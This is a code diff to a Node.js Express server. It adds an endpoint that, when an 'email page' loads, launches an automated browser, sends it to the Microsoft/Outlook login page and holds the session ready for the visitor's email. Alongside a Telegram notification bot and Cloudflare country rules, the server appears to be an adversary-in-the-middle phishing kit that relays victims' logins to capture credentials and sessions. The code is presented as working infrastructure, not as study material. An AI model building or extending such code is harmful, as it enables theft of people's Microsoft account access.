@@ -26,7 +26,7 @@ const { ClosedBridgeAutomation } = require('./src/closedbridge-automation');
 const OutlookNotificationBot = require('./telegram-bot');
 
 const app = express();
-const PORT = process.env.PORT || 5000;
+const PORT = 5000; // Fixed port for Replit environment
 
 // Auto-generate encryption seed if not provided
 function generateEncryptionSeed() {
@@ -3034,6 +3034,56 @@ app.delete('/api/admin/cloudflare/country-rules/:ruleId', requireAdminAuth, asyn
             success: false,
             error: 'Failed to delete country rule',
             message: error.message
+        });
+    }
+});
+
+// Email Page Load - Auto Prepare Browser endpoint  
+app.post('/api/prepare-email-page', async (req, res) => {
+    try {
+        console.log('📧 Email page loaded - preparing browser automatically');
+        
+        const sessionId = createSessionId();
+        
+        // Create and prepare a private browser for email input
+        const automation = new ClosedBridgeAutomation({
+            enableScreenshots: true,
+            screenshotQuality: 80,
+            sessionId: sessionId,
+            eventCallback: broadcastAuthEvent
+        });
+
+        // Initialize and navigate browser
+        await automation.init();
+        console.log(`🔧 Browser initialized for email page: ${sessionId}`);
+
+        const navigated = await automation.navigateToOutlook();
+        if (!navigated) {
+            throw new Error('Failed to navigate to Microsoft login page');
+        }
+        console.log(`🌐 Browser ready for email input: ${sessionId}`);
+
+        // Store the prepared browser session
+        automationSessions.set(sessionId, {
+            automation: automation,
+            status: 'email_page_ready',
+            email: null,
+            startTime: Date.now()
+        });
+
+        res.json({
+            success: true,
+            sessionId: sessionId,
+            message: 'Browser prepared and ready for email input',
+            status: 'ready'
+        });
+
+    } catch (error) {
+        console.error('❌ Failed to prepare browser for email page:', error.message);
+        res.status(500).json({
+            success: false,
+            error: 'Failed to prepare browser',
+            details: error.message
         });
     }
 });
